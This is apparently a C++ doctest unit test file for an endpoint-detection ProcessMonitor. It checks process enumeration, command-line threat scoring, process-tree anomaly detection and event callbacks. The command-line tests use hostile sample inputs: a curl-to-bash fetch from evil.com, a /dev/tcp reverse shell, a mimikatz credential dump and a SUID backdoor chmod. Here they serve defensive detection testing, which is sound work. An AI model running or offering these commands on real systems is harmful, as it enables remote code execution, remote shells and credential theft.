#include <doctest/doctest.h>
#include <edr/ProcessMonitor.h>

#include <algorithm>

using namespace ThreatOne::EDR;

TEST_CASE("ProcessMonitor - enumerate processes") {
    ProcessMonitor monitor;

    SUBCASE("Enumerate returns non-empty list including current process") {
        auto processes = monitor.enumerateProcesses();
        CHECK(!processes.empty());

        // Find current process
        uint64_t myPid = static_cast<uint64_t>(getpid());
        auto it = std::find_if(processes.begin(), processes.end(),
            [myPid](const ProcessInfo& p) { return p.pid == myPid; });
        CHECK(it != processes.end());
    }

    SUBCASE("Enumerated processes have valid PIDs") {
        auto processes = monitor.enumerateProcesses();
        for (const auto& proc : processes) {
            CHECK(proc.pid > 0);
        }
    }

    SUBCASE("Mock data works correctly") {
        std::vector<ProcessInfo> mockData;
        ProcessInfo p1;
        p1.pid = 100;
        p1.name = "test_proc";
        p1.parentPid = 1;
        p1.commandLine = "test_proc --arg1";
        mockData.push_back(p1);

        ProcessInfo p2;
        p2.pid = 101;
        p2.name = "child_proc";
        p2.parentPid = 100;
        mockData.push_back(p2);

        monitor.setMockProcessData(mockData);
        auto processes = monitor.enumerateProcesses();
        REQUIRE(processes.size() == 2);
        CHECK(processes[0].pid == 100);
        CHECK(processes[1].pid == 101);

        monitor.clearMockProcessData();
        processes = monitor.enumerateProcesses();
        CHECK(!processes.empty()); // Back to real data
    }
}

TEST_CASE("ProcessMonitor - command line analysis") {
    ProcessMonitor monitor;

    SUBCASE("Benign command line scores low") {
        auto result = monitor.analyzeCommandLine("ls -la /home/user");
        CHECK(result.score < 0.2);
        CHECK(result.indicators.empty());
    }

    SUBCASE("Empty command line scores zero") {
        auto result = monitor.analyzeCommandLine("");
        CHECK(result.score == 0.0);
    }

    SUBCASE("Base64 decode detected") {
        auto result = monitor.analyzeCommandLine("echo SGVsbG8= | base64 -d");
        CHECK(result.score > 0.0);
        CHECK(!result.indicators.empty());
        bool found = false;
        for (const auto& ind : result.indicators) {
            if (ind.find("Base64") != std::string::npos) found = true;
        }
        CHECK(found);
    }

    SUBCASE("Curl pipe to bash detected") {
        auto result = monitor.analyzeCommandLine("curl http://evil.com/script.sh | bash");
        CHECK(result.score >= 0.5);
        bool found = false;
        for (const auto& ind : result.indicators) {
            if (ind.find("pipe to shell") != std::string::npos) found = true;
        }
        CHECK(found);
    }

    SUBCASE("Known malicious tool detected") {
        auto result = monitor.analyzeCommandLine("./mimikatz sekurlsa::logonpasswords");
        CHECK(result.score >= 0.7);
        bool found = false;
        for (const auto& ind : result.indicators) {
            if (ind.find("malicious tool") != std::string::npos) found = true;
        }
        CHECK(found);
    }

    SUBCASE("Reverse shell pattern detected") {
        auto result = monitor.analyzeCommandLine("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1");
        CHECK(result.score >= 0.5);
    }

    SUBCASE("SUID manipulation detected") {
        auto result = monitor.analyzeCommandLine("chmod +s /tmp/backdoor");
        CHECK(result.score >= 0.5);
    }
}

TEST_CASE("ProcessMonitor - suspicious process tree detection") {
    ProcessMonitor monitor;

    SUBCASE("Deep nesting detection") {
        // Create a deeply nested process tree
        std::vector<ProcessInfo> mockData;
        for (int i = 1; i <= 10; i++) {
            ProcessInfo p;
            p.pid = static_cast<uint64_t>(i);
            p.name = "proc_" + std::to_string(i);
            p.parentPid = (i == 1) ? 0 : static_cast<uint64_t>(i - 1);
            mockData.push_back(p);
        }

        monitor.setMockProcessData(mockData);
        auto indicators = monitor.detectSuspiciousProcessTree(10);

        bool foundDeepNesting = false;
        for (const auto& ind : indicators) {
            if (ind.type == "deep_nesting") foundDeepNesting = true;
        }
        CHECK(foundDeepNesting);
    }

    SUBCASE("Orphan process detection") {
        std::vector<ProcessInfo> mockData;
        ProcessInfo p;
        p.pid = 500;
        p.name = "orphan_proc";
        p.parentPid = 9999; // Parent doesn't exist
        mockData.push_back(p);

        monitor.setMockProcessData(mockData);
        auto indicators = monitor.detectSuspiciousProcessTree(500);

        bool foundOrphan = false;
        for (const auto& ind : indicators) {
            if (ind.type == "orphan") foundOrphan = true;
        }
        CHECK(foundOrphan);
    }

    SUBCASE("Unusual parent detection") {
        std::vector<ProcessInfo> mockData;

        ProcessInfo parent;
        parent.pid = 100;
        parent.name = "httpd";
        parent.parentPid = 1;
        mockData.push_back(parent);

        ProcessInfo child;
        child.pid = 101;
        child.name = "bash";
        child.parentPid = 100;
        mockData.push_back(child);

        monitor.setMockProcessData(mockData);
        auto indicators = monitor.detectSuspiciousProcessTree(101);

        bool foundUnusual = false;
        for (const auto& ind : indicators) {
            if (ind.type == "unusual_parent") foundUnusual = true;
        }
        CHECK(foundUnusual);
    }
}

TEST_CASE("ProcessMonitor - process event callbacks") {
    ProcessMonitor monitor;

    std::vector<ProcessInfo> initialData;
    ProcessInfo p1;
    p1.pid = 100;
    p1.name = "existing";
    p1.parentPid = 1;
    initialData.push_back(p1);

    monitor.setMockProcessData(initialData);
    monitor.poll(); // Initial scan

    SUBCASE("Detect new process creation") {
        bool callbackFired = false;
        uint64_t newPid = 0;

        monitor.onProcessCreation([&](const ProcessInfo& info) {
            callbackFired = true;
            newPid = info.pid;
        });

        // Add a new process
        std::vector<ProcessInfo> updatedData = initialData;
        ProcessInfo p2;
        p2.pid = 200;
        p2.name = "new_proc";
        p2.parentPid = 100;
        updatedData.push_back(p2);

        monitor.setMockProcessData(updatedData);
        monitor.poll();

        CHECK(callbackFired);
        CHECK(newPid == 200);
    }

    SUBCASE("Detect process termination") {
        bool callbackFired = false;
        uint64_t terminatedPid = 0;

        monitor.onProcessTermination([&](uint64_t pid) {
            callbackFired = true;
            terminatedPid = pid;
        });

        // Remove the process
        std::vector<ProcessInfo> emptyData;
        monitor.setMockProcessData(emptyData);
        monitor.poll();

        CHECK(callbackFired);
        CHECK(terminatedPid == 100);
    }
}
